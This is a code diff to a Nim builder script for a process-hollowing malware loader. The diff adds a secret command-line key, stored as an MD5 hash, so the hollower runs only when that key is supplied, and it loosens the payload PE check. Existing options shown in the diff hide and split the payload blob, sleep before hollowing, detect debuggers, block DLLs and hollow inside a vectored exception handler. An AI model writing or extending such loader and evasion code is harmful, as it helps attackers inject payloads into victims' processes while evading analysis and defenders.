@@ -1,3 +1,4 @@
+import md5
 import osproc
 import argparse
 import ptr_math
@@ -5,6 +6,7 @@ import strformat
 import supersnappy
 import winim/inc/[rpc, windef]
 from std/base64 import encode
+
 
 # YOU HAVE TO HAVE A TOOL BANNER
 const pichichiBanner = """
@@ -64,6 +66,7 @@ var isBlockDlls: bool
 var isSplit: bool
 var sleepSeconds: string
 var antiDebugg: string
+var key: string
 var isVeh: bool
 var isDebug: bool
 
@@ -103,6 +106,7 @@ when isMainModule:
         flag("-p", "--split", help="Split and hide the payload blob in hollower (takes long to compile!)")
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
         option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
+        option("-k", "--key", help="Hollower will run only when this supplied key is a command line argument", default=some(""))
         flag("-v", "--veh", help="Hollow will occur within VEH")
         flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
     # Parse arguments
@@ -121,6 +125,7 @@ when isMainModule:
         isSplit = opts.split
         sleepSeconds = opts.sleep
         antiDebugg = opts.anti_debug
+        key = opts.key
         isVeh = opts.veh
         isDebug = opts.debug
     except ShortCircuit as err:
@@ -140,8 +145,8 @@ when isMainModule:
     var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
     var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
     var peImageMagic = cast[size_t](peImageNtHeaders.OptionalHeader.Magic)
-    if peImageMagic != 523 or not pePath.endsWith(".exe"):
-        echo "[-] Payload is not a valid x64 exe format"
+    if peImageMagic != 523:
+        echo "[-] Payload is not a valid x64 PE"
         quit(1)
 
     # Validate params
@@ -152,6 +157,11 @@ when isMainModule:
     # Compress & encode exe payload
     var compressedPe = compress(peStr)
     var compressedBase64PE = encode(compressedPe)
+
+    # Md5 key
+    var keyMd5 = ""
+    if key != "":
+        keyMd5 = getMd5(key)
 
     # Write the parameters to the loader params
     var paramsPath = "Loader/params.nim"
@@ -170,6 +180,7 @@ var sponsorParams* = protectString(r" {sponsorParams}")
 var dllExportName* = protectString("{outDllExportName}") 
 var isBlockDlls* = {isBlockDlls}
 var antiDebugAction* = protectString("{antiDebugg}")
+var keyMd5* = protectString("{keyMd5}")
 var sleepSeconds* = {sleepSeconds}
 var isVeh* = {isVeh}
     """
@@ -220,7 +231,9 @@ proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
     if res[1] == 0:
         echo "[+] Compiled successfully"
         if injectionMethod in ["4", "5", "6"]:
-            echo "[i] Run the hollower with -M argument"
+            echo "[i] Run the hollower with '-M' argument"
+        if key != "":
+            echo fmt"[i] Run the hollower with '{key}' argument"
     else:
         echo "[-] Error compiling. compilation output:"
         echo res[0]
